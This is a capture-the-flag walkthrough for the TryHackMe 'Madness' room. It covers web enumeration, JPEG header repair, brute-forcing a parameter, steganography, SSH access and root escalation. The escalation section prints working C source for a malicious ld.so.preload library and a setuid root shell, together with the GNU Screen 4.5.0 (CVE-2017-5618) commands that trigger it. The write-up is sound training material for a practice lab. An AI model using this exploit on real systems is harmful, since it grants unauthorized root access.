# Madness

Will you be consumed by Madness?

Room: https://tryhackme.com/room/madness

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/madness.md

---------

## Overview

Madness is a Linux CTF room that combines:

* Web enumeration
* File-header repair
* Hidden directory discovery
* Parameter brute forcing
* Steganography
* ROT13 decoding
* SSH access
* SUID enumeration
* GNU Screen privilege escalation

The room starts with a simple Apache web server, but the path to initial access is hidden inside a damaged image.

---

# Initial Enumeration

Start with a full TCP port scan:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

The scan reveals two open services:

```text
22/tcp open  ssh
80/tcp open  http
```

The web service is running Apache on Ubuntu.

Browse to:

```text
http://<TARGET_IP>/
```

The page appears to be the default Apache page, so inspect the HTML source:

```bash
curl -s http://<TARGET_IP>/
```

You can also use the browser’s **View Page Source** option.

Inside the source is a reference to an image named:

```text
thm.jpg
```

Download it:

```bash
wget http://<TARGET_IP>/thm.jpg
```

---

# Inspecting the Image

Check the file type:

```bash
file thm.jpg
```

The file does not identify correctly as a JPEG.

Inspect the beginning of the file:

```bash
xxd thm.jpg | head
```

A normal JPEG should begin with the magic bytes:

```text
ff d8 ff
```

The file contents resemble JPEG data, but the header is damaged.

---

# Repairing the JPEG

Create a new file with the correct JPEG start-of-image bytes:

```bash
printf '\xff\xd8' > fixed.jpg
```

Append the useful part of the original file while skipping the damaged header:

```bash
dd if=thm.jpg bs=1 skip=20 >> fixed.jpg
```

Check the repaired file:

```bash
file fixed.jpg
```

It should now be recognised as a JPEG image.

Open it:

```bash
xdg-open fixed.jpg
```

The repaired image reveals a hidden web directory.

Browse to the path shown in the image:

```text
http://<TARGET_IP>/<DISCOVERED_DIRECTORY>/
```

---

# Hidden Parameter

The hidden page expects a GET parameter named:

```text
secret
```

Test it manually:

```bash
curl -s "http://<TARGET_IP>/<DISCOVERED_DIRECTORY>/?secret=1"
```

Incorrect values return a message indicating that the supplied value is wrong.

Because the expected value appears to be within a small numeric range, brute-force it with a loop.

```bash
for i in $(seq 0 99); do
    response=$(curl -s "http://<TARGET_IP>/<DISCOVERED_DIRECTORY>/?secret=$i")

    if ! echo "$response" | grep -qi "wrong"; then
        echo "[+] Possible value: $i"
    fi
done
```

Alternatively:

```bash
for i in $(seq 0 99); do
    curl -s "http://<TARGET_IP>/<DISCOVERED_DIRECTORY>/?secret=$i" |
        grep -q "wrong" || echo "[+] $i"
done
```

The successful request returns a password intended for use with the repaired image.

---

# Extracting Hidden Data from the Image

Use `steghide` against the repaired image:

```bash
steghide extract -sf fixed.jpg
```

Enter the password recovered from the hidden web page.

A text file is extracted:

```text
hidden.txt
```

Read it:

```bash
cat hidden.txt
```

The file contains an encoded username.

The text is ROT13-encoded.

Decode it using:

```bash
echo '<ENCODED_USERNAME>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

You can also use:

```bash
echo '<ENCODED_USERNAME>' | rot13
```

if a ROT13 utility is installed.

This reveals the SSH username.

---

# Recovering the SSH Password

The room also points to a second image hosted externally.

Download it:

```bash
wget https://assets.tryhackme.com/additional/imgur/5iW7kC8.jpg
```

Check whether it contains embedded data:

```bash
steghide info 5iW7kC8.jpg
```

Extract the contents:

```bash
steghide extract -sf 5iW7kC8.jpg
```

No passphrase is required for this stage.

The extraction creates:

```text
password.txt
```

Read it:

```bash
cat password.txt
```

This provides the SSH password.

---

# SSH Access

Connect to the target using the recovered username and password:

```bash
ssh <RECOVERED_USERNAME>@<TARGET_IP>
```

Verify the session:

```bash
whoami
id
hostname
```

You should now have access as the low-privileged user.

---

# User Flag

List the current user’s home directory:

```bash
ls -la ~
```

Search for the user flag:

```bash
find /home -name user.txt 2>/dev/null
```

Read it:

```bash
cat ~/user.txt
```

Submit the value to TryHackMe.

---

# Privilege Escalation Enumeration

Start with basic checks:

```bash
sudo -l
```

Check the operating system and kernel:

```bash
uname -a
cat /etc/os-release
```

Enumerate cron jobs:

```bash
cat /etc/crontab
ls -la /etc/cron*
```

Check for writable files and directories:

```bash
find / -writable -type f 2>/dev/null | head -n 50
find / -writable -type d 2>/dev/null | head -n 50
```

The important finding comes from SUID enumeration.

Run:

```bash
find / -perm -4000 -type f -printf '%u %g %m %p\n' 2>/dev/null
```

Among the normal SUID binaries are two unusual entries:

```text
/bin/screen-4.5.0
/bin/screen-4.5.0.old
```

Check the permissions directly:

```bash
ls -la /bin/screen-4.5.0
```

The binary is owned by root and has the SUID bit set.

Check its version:

```bash
/bin/screen-4.5.0 --version
```

GNU Screen 4.5.0 is vulnerable to a local privilege-escalation flaw associated with logfile handling.

The vulnerability is:

```text
CVE-2017-5618
```

The issue affects GNU Screen versions before 4.5.1 when the binary is installed SUID root.

---

# Understanding the Exploit

The vulnerable Screen binary can create or modify a logfile with root privileges.

The exploit abuses this behaviour to create:

```text
/etc/ld.so.preload
```

This file tells the dynamic linker to load a specified shared library whenever a dynamically linked program starts.

The malicious shared library will:

1. Change `/tmp/rootshell` ownership to root.
2. Apply the SUID bit.
3. Remove `/etc/ld.so.preload` to prevent repeated preload errors.

The result is a root-owned SUID shell.

---

# Creating the Malicious Shared Library

Create the source file:

```bash
cat > /tmp/libhax.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>

__attribute__((constructor))
void dropshell(void)
{
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
}
EOF
```

Compile it as a shared library:

```bash
gcc -fPIC -shared -o /tmp/libhax.so /tmp/libhax.c
```

Confirm the file was created:

```bash
file /tmp/libhax.so
ls -la /tmp/libhax.so
```

---

# Creating the Root Shell

Create the shell source:

```bash
cat > /tmp/rootshell.c <<'EOF'
#include <unistd.h>

int main(void)
{
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
EOF
```

Compile it:

```bash
gcc -o /tmp/rootshell /tmp/rootshell.c
```

Check the resulting binary:

```bash
file /tmp/rootshell
ls -la /tmp/rootshell
```

At this stage it is still owned by the current user and is not yet SUID root.

---

# Exploiting GNU Screen

Move to `/etc`:

```bash
cd /etc
```

Set a permissive file-creation mask:

```bash
umask 000
```

Use the vulnerable Screen binary to create the preload file:

```bash
/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne '\n/tmp/libhax.so'
```

This causes the SUID Screen binary to create:

```text
/etc/ld.so.preload
```

with the shared-library path inside it.

Trigger a privileged process:

```bash
/bin/screen-4.5.0 -ls
```

You may see an error similar to:

```text
' from /etc/ld.so.preload cannot be preloaded
```

This does not necessarily mean the exploit failed.

The shared-library constructor may already have executed.

---

# Verifying the Exploit

Check the root-shell permissions:

```bash
ls -l /tmp/rootshell
```

A successful exploit should show something similar to:

```text
-rwsr-xr-x 1 root root ...
```

The important details are:

```text
Owner: root
SUID bit: set
```

The `s` in the owner execute position confirms the SUID bit:

```text
-rwsr-xr-x
```

---

# Obtaining Root

Run the privileged shell:

```bash
/tmp/rootshell
```

Verify your identity:

```bash
whoami
id
```

The output should show that the shell is running as root.

Move to the root directory:

```bash
cd /root
```

List its contents:

```bash
ls -la
```

Read the root flag:

```bash
cat root.txt
```

Submit the value to TryHackMe.

---

# Cleanup

The exploit attempts to remove `/etc/ld.so.preload` automatically.

Confirm that it no longer exists:

```bash
ls -la /etc/ld.so.preload
```

If it remains and you are root, remove it:

```bash
rm -f /etc/ld.so.preload
```

You can also remove the temporary exploit files:

```bash
rm -f /tmp/libhax.c
rm -f /tmp/libhax.so
rm -f /tmp/rootshell.c
rm -f /tmp/rootshell
```

---

# Attack Path Summary

```text
Nmap scan
    ↓
Apache web server discovered
    ↓
Page source inspected
    ↓
thm.jpg downloaded
    ↓
Damaged JPEG header identified
    ↓
JPEG repaired
    ↓
Hidden directory recovered from image
    ↓
secret parameter discovered
    ↓
Numeric value brute-forced
    ↓
Steghide password recovered
    ↓
Username extracted from repaired image
    ↓
ROT13 decoded
    ↓
Second image downloaded
    ↓
SSH password extracted with steghide
    ↓
SSH access obtained
    ↓
User flag recovered
    ↓
SUID binaries enumerated
    ↓
GNU Screen 4.5.0 discovered
    ↓
CVE-2017-5618 identified
    ↓
/etc/ld.so.preload abused
    ↓
Root-owned SUID shell created
    ↓
Root access obtained
```

---

# Key Commands

## Enumeration

```bash
nmap -sC -sV -p- <TARGET_IP>
curl -s http://<TARGET_IP>/
wget http://<TARGET_IP>/thm.jpg
file thm.jpg
xxd thm.jpg | head
```

## JPEG Repair

```bash
printf '\xff\xd8' > fixed.jpg
dd if=thm.jpg bs=1 skip=20 >> fixed.jpg
file fixed.jpg
xdg-open fixed.jpg
```

## Secret Brute Force

```bash
for i in $(seq 0 99); do
    curl -s "http://<TARGET_IP>/<DISCOVERED_DIRECTORY>/?secret=$i" |
        grep -q "wrong" || echo "[+] $i"
done
```

## Steganography

```bash
steghide extract -sf fixed.jpg
cat hidden.txt

wget https://assets.tryhackme.com/additional/imgur/5iW7kC8.jpg
steghide extract -sf 5iW7kC8.jpg
cat password.txt
```

## ROT13

```bash
echo '<ENCODED_USERNAME>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

## SSH

```bash
ssh <RECOVERED_USERNAME>@<TARGET_IP>
```

## SUID Enumeration

```bash
find / -perm -4000 -type f -printf '%u %g %m %p\n' 2>/dev/null
/bin/screen-4.5.0 --version
```

## GNU Screen Exploit

```bash
cat > /tmp/libhax.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>

__attribute__((constructor))
void dropshell(void)
{
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
}
EOF
```

```bash
cat > /tmp/rootshell.c <<'EOF'
#include <unistd.h>

int main(void)
{
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
EOF
```

```bash
gcc -fPIC -shared -o /tmp/libhax.so /tmp/libhax.c
gcc -o /tmp/rootshell /tmp/rootshell.c

cd /etc
umask 000

/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne '\n/tmp/libhax.so'
/bin/screen-4.5.0 -ls

ls -l /tmp/rootshell
/tmp/rootshell
```

---

# Lessons Learned

* File extensions cannot be trusted on their own.
* Magic bytes are often more useful than filenames.
* Damaged files may still contain recoverable data.
* Image-based clues are common in beginner CTF rooms.
* Small numeric parameters can be efficiently brute-forced with shell loops.
* Steganography may require information gathered from earlier stages.
* ROT13 is encoding, not encryption.
* Unusual SUID binaries should always be investigated.
* SUID GNU Screen 4.5.0 is a strong indicator of CVE-2017-5618.
* Exploit success should be verified through ownership and permission changes.
* Error messages during exploitation do not always indicate complete failure.
